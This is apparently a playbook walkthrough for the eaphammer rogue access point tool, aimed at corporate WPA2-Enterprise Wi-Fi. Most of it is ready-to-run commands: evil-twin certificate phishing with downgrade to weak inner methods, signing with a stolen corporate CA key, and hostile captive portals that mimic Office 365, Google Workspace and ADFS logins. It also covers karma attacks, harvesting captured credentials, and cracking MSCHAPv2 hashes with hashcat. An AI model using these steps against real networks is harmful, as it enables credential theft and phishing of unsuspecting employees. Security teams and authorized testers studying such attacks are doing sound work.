# eaphammer — walkthrough

Gabriel Ryan's enterprise-evil-twin standard. Ergonomically superior
to hostapd-wpe when you're cert-phishing with weak validators. Reach
for it first unless you specifically need the hostapd-wpe layer of
control.

## Preconditions

- eaphammer cloned + set up (`./kali-setup` or `./ubuntu-setup`).
- Monitor+injection adapter.
- Optional: a target CA key (for matching-cert phishing).

## Path A — Baseline cert-phish

```
cd eaphammer
./eaphammer --cert-wizard          # generates self-signed cert once

./eaphammer -i wlan1 \
  --essid "CorporateWiFi" \
  --channel 6 \
  --auth wpa-eap \
  --creds \
  --negotiate weakest
```

- `--auth wpa-eap` = WPA2-Enterprise.
- `--creds` = log captured inner-EAP material.
- `--negotiate weakest` = offer the weakest inner method first
  (EAP-MD5, EAP-GTC, then MSCHAPv2).

Captured material lands in `loot/`.

## Path B — Target-CA-matched cert

```
./eaphammer --cert-wizard \
  --ca-key /path/to/corp-ca.key \
  --ca-cert /path/to/corp-ca.crt \
  --cn "radius.corp.local" \
  --org "Corp Inc"
```

Now clients that validate against corp-ca.crt accept the eaphammer
cert. Combines with:

```
./eaphammer -i wlan1 --essid "CorporateWiFi" --auth wpa-eap --creds
```

## Path C — Hostile captive portal chain

Chain EAP capture with a captive portal that grabs additional creds
after "success":

```
./eaphammer -i wlan1 \
  --essid "CorporateWiFi" \
  --auth wpa-eap \
  --creds \
  --hostile-portal \
  --portal-template office365
```

Templates ship for Office 365, Google Workspace, ADFS, and generic
corporate SSO look-alikes.

## Path D — Karma-family attack

eaphammer can also run WPA2-Personal karma if the target uses PSK
networks:

```
./eaphammer -i wlan1 \
  --auth open \
  --karma \
  --loud
```

Or combined with cert-phish for enterprise karma:

```
./eaphammer -i wlan1 --auth wpa-eap --karma --creds
```

## Path E — Read the harvest

```
ls loot/
# 2026-08-04-2145-mschapv2.creds
# 2026-08-04-2145-gtc.tokens
# 2026-08-04-2145-summary.log

cat loot/2026-08-04-2145-summary.log
# username: alice, method: mschapv2, hashcat: alice::corp:...
```

Feed straight to hashcat:

```
hashcat -m 5500 loot/2026-08-04-2145-mschapv2.creds rockyou.txt -w 4
```

## Path F — Chain with a real RADIUS backend

For complex Passpoint / OSU flows, point eaphammer at an external
freeradius-wpe:

```
./eaphammer -i wlan1 \
  --essid "PublicHotspot" \
  --auth wpa-eap \
  --radius-server 127.0.0.1 \
  --radius-secret testing123
```

## Failure modes

- **Cert rejected.** Client strictly validates. Retry with Path B
  (target CA).
- **`--negotiate downgrade` refused.** Client profile pins the inner
  method. Only that method opens.
- **eaphammer's setup script fails.** Distro-specific dep problem.
  `./kali-setup` targets Kali; on Ubuntu use `./ubuntu-setup`; on
  the Pineapple, install manually.
- **PMF mismatch.** eaphammer defaults to PMF-optional; some target
  clients require it. Add `--pmf required` if the target beacon has
  MFPR=1.
- **Kismet or another daemon owns the iface.** `airmon-ng check kill`
  before starting eaphammer.

## Best-practice loop

1. Recon → identify the enterprise SSID's cert CN + CA.
2. If CA leak available (Path B), use it.
3. If not, self-signed cert + weakest-negotiate; hope weak clients
   trust-and-continue.
4. Harvest ~15 minutes; watch `loot/`.
5. Crack MSCHAPv2 offline; the plaintext GTC tokens are flag
   surfaces directly.

## Cite

- s0lst1c3/eaphammer GitHub.
- Gabriel Ryan — DEFCON, BSides talks (2017–2020).
- Wright — asleap.
- attacks.json: `rogue-radius-eaphammer`,
  `cert-phish-eaphammer-weak-validation`,
  `eap-inner-downgrade-peap-mschapv2`,
  `eap-inner-downgrade-peap-gtc`,
  `eap-gtc-plaintext-token-capture`,
  `mschapv2-challenge-response-capture`,
  `hashcat-5500-mschapv2-crack`,
  `mdm-profile-theft-captive-portal`.
